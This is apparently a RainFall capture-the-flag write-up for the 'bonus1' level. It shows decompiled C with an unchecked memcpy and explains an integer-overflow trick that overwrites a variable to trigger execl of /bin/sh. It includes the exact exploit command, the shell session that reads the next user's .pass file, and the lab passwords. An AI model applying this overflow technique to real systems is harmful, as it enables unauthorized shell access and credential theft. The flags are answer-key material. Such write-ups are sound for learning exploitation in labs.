# **Bonus1**

## **Analysis**

**In `main()`:**

```c
    char    str[40];

    // Atoi first agrument and check if its inferior or equal to 9
    n = atoi(av[1])
    if (n > 9)
        return (1);
    else {
        // Unprotected memcpy to str, from 2nd argument with a length of the atoi from 1st arg multiply by 4
        memcpy(str, av[2], n * 4);
        // if atoi from 1st arg equal 1464814662, execute shell
        if (n == 0x574f4c46) // 1464814662
            execl("/bin/sh", "sh", 0);
    }
```

___

## **Exploit**

So we need a number inferior to 10 as first arg which multiply by 4 is superior to 40 to overflow `str`

A negative will always be inferior to 10, and multiply by 4 can be superior to 40

But at the end, this number should equal to 1464814662

= = = = = = = =

To match all this conditions, we will overflow str to rewrite `n`

https://www.binaryconvert.com/

44 = 00000000 00000000 00000000 00101100

11 = 00000000 00000000 00000000 00001011

10000000 00000000 00000000 00001011 = -2147483637

with overflow -2147483637 * 4 = 00000000 00000000 00000000 00101100 = 44

= = = = = = = =

Solution:
 * 1st Arg
   * -2147483637
 * 2nd Arg:
   * (40) Offset
   * (04) New value for `n`

```
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "\x90" * 40 + "\x46\x4c\x4f\x57"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

___

*Password: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9*